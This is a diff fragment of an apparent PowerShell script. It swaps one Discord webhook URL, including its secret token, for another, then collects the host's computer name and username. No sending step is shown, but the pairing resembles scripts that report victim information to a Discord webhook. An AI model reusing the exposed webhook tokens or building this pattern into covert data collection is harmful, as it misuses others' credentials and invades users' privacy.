@@ -1,5 +1,5 @@
 # Discord Webhook
-$webhook = "https://discord.com/api/webhooks/1467172875529228422/3X57JscpSXinJkZzei7XYF1JVmRx6hfSzMGx9PXOgC0Aawp4fIeN1E37Bd4OAfSJIGO0"
+$webhook = "https://discord.com/api/webhooks/1467247480428171385/TSirVX8AGKGeYAOImDkrGzyQGQjgGRMq6_E-zkv8UTIzu5jBzFGIC4ug15xtQSTys27R"
 
 # Get PC info
 $pc = "$env:COMPUTERNAME | $env:USERNAME"
